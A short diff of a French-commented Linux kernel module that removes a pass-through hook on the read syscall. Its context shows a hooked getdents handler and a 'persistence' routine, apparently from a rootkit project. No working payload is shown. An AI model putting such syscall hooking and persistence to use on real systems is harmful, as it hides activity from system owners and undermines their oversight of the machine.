@@ -226,22 +226,6 @@ static asmlinkage long my_getdents(const struct pt_regs *pt_regs)
     return ret;
 	
 }
-
-/**
- * Fonction personnalisée pour l'appel système read.
- * Actuellement, cette fonction redirige simplement vers l'appel système read original.
- * Des extensions futures pourraient inclure des fonctionnalités supplémentaires.
- * @param pt_regs Structure contenant les registres du processeur.
- * @return Le nombre de bytes lus, ou un code d'erreur en cas d'échec.
- */
-
-static asmlinkage ssize_t my_read(const struct pt_regs *pt_regs)
-{
-  ssize_t ret = orig_read(pt_regs);
-  char *ptr = pt_regs->si;
-  return ret;
-}
-
 /**
  * Implémente une fonction de persistance pour le module kernel.
  * Exécute une commande pour afficher un message via 'wall' et imprime un message de journalisation.
